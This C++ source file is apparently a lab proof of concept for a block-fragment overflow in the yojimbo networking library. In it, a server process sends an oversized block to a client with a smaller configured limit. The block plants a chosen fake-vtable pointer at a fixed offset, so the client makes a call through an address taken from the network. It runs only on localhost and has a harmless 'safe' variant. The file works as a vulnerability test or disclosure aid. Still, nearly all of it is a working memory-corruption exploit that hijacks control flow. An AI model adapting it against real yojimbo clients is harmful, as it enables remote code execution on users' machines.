/*
    W3 lab-only split-process replay of the yojimbo block-fragment overflow.

    Two real processes on 127.0.0.1, same non-PIE ASan binary:
      server mode: netcode server (1500/500) sends a crafted 1500-byte block
                   whose final fragment carries a chosen fake-vtable pointer
                   at block offset 1152 and "MISHE-LOOP" at offset 1200.
      client mode: netcode client (1100/500) connects, receives, and prints
                   MISHE-VTABLE-CALL from the wire-borne pointer if the
                   vulnerable channel is in use.

    variant "safe" sends a legitimate 1000-byte block (exact fit) instead.
    No external system is contacted.
*/

#include "yojimbo.h"
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <unistd.h>

#include "shared.h"
#include "serialize.h"
#include <sodium.h>

using namespace yojimbo;

// Must be identical to vtable-test.cpp so the chosen absolute address is the
// same value in both processes of this non-PIE build.
extern "C" void mishe_vtable_marker( void * )
{
    printf( "MISHE-VTABLE-CALL\n" );
    fflush( stdout );
}

static void * g_mishe_fake_vtable[4] = {
    (void*) &mishe_vtable_marker,
    (void*) &mishe_vtable_marker,
    (void*) &mishe_vtable_marker,
    (void*) &mishe_vtable_marker
};

static void CheckHandler( const char * condition,
                          const char * function,
                          const char * file,
                          int line )
{
    printf( "check failed: ( %s ), function %s, file %s, line %d\n", condition, function, file, line );
    fflush( stdout );
#ifndef NDEBUG
    __builtin_trap();
#endif
    exit( 1 );
}

#define check( condition )                                                     \
do                                                                             \
{                                                                              \
    if ( !(condition) )                                                        \
        CheckHandler( #condition, __FUNCTION__, __FILE__, __LINE__ );          \
} while(0)

static void run_server( bool attack )
{
    Address serverAddress( "127.0.0.1", ServerPort );

    double time = 100.0;

    ClientServerConfig config;
    config.networkSimulator = false;
    config.channel[0].type = CHANNEL_TYPE_RELIABLE_ORDERED;
    config.channel[0].maxBlockSize = 1500;
    config.channel[0].blockFragmentSize = 500;

    uint8_t privateKey[KeyBytes];
    memset( privateKey, 0, KeyBytes );

    Server server( GetDefaultAllocator(), privateKey, serverAddress, config, adapter, time );
    server.Start( 1 );

    printf( "server listening on 127.0.0.1:%d\n", ServerPort );
    fflush( stdout );

    int connected = 0;
    for ( int i = 0; i < 2000; ++i )
    {
        server.SendPackets();
        server.ReceivePackets();
        time += 0.1;
        server.AdvanceTime( time );
        usleep( 1000 );
        if ( server.GetNumConnectedClients() == 1 )
        {
            connected = 1;
            break;
        }
    }
    check( connected );

    printf( "server client connected\n" );
    fflush( stdout );

    const int blockBytes = attack ? 1500 : 1000;

    TestBlockMessage * message = (TestBlockMessage*) server.CreateMessage( 0, TEST_BLOCK_MESSAGE );
    check( message );
    uint8_t * blockData = server.AllocateBlock( 0, blockBytes );
    check( blockData );
    memset( blockData, 0xAB, blockBytes );
    memcpy( blockData + blockBytes - 11, "MISHE-LOOP", 11 );
    if ( attack )
    {
        uint64_t chosenVptr = (uint64_t) (uintptr_t) &g_mishe_fake_vtable;
        memcpy( blockData + 1152, &chosenVptr, 8 );
        printf( "server chosen vptr %016" PRIx64 "\n", chosenVptr );
    }
    server.AttachBlockToMessage( 0, message, blockData, blockBytes );
    server.SendMessage( 0, 0, message );

    for ( int i = 0; i < 400; ++i )
    {
        server.SendPackets();
        server.ReceivePackets();
        time += 0.1;
        server.AdvanceTime( time );
        usleep( 1000 );
    }

    printf( "server done\n" );
    fflush( stdout );
    server.Stop();
}

static void run_client()
{
    Address clientAddress( "0.0.0.0", ClientPort );
    Address serverAddress( "127.0.0.1", ServerPort );

    double time = 100.0;

    ClientServerConfig config;
    config.networkSimulator = false;
    config.channel[0].type = CHANNEL_TYPE_RELIABLE_ORDERED;
    config.channel[0].maxBlockSize = 1100;
    config.channel[0].blockFragmentSize = 500;

    Client client( GetDefaultAllocator(), clientAddress, config, adapter, time );

    uint8_t privateKey[KeyBytes];
    memset( privateKey, 0, KeyBytes );
    client.InsecureConnect( privateKey, 1, serverAddress );

    printf( "client connecting to 127.0.0.1:%d\n", ServerPort );
    fflush( stdout );

    int connected = 0;
    for ( int i = 0; i < 2000; ++i )
    {
        client.SendPackets();
        client.ReceivePackets();
        time += 0.1;
        client.AdvanceTime( time );
        usleep( 1000 );
        if ( client.IsConnected() )
        {
            connected = 1;
            break;
        }
        if ( client.ConnectionFailed() )
            break;
    }
    check( connected );

    printf( "client connected\n" );
    fflush( stdout );

    for ( int i = 0; i < 400; ++i )
    {
        client.SendPackets();
        client.ReceivePackets();
        time += 0.1;
        client.AdvanceTime( time );
        usleep( 1000 );
    }

    printf( "client done\n" );
    fflush( stdout );
    client.Disconnect();
}

int main( int argc, char ** argv )
{
    check( InitializeYojimbo() );

    if ( argc < 2 )
    {
        printf( "usage: test server|client [attack|safe]\n" );
        return 2;
    }

    const bool isServer = strcmp( argv[1], "server" ) == 0;
    const bool attack = ( argc < 3 ) || ( strcmp( argv[2], "safe" ) != 0 );

    printf( "mode=%s variant=%s fake_vtable=%p\n",
            isServer ? "server" : "client",
            attack ? "attack" : "safe",
            (void*) &g_mishe_fake_vtable );
    fflush( stdout );

    if ( isServer )
        run_server( attack );
    else
        run_client();

    ShutdownYojimbo();
    return 0;
}
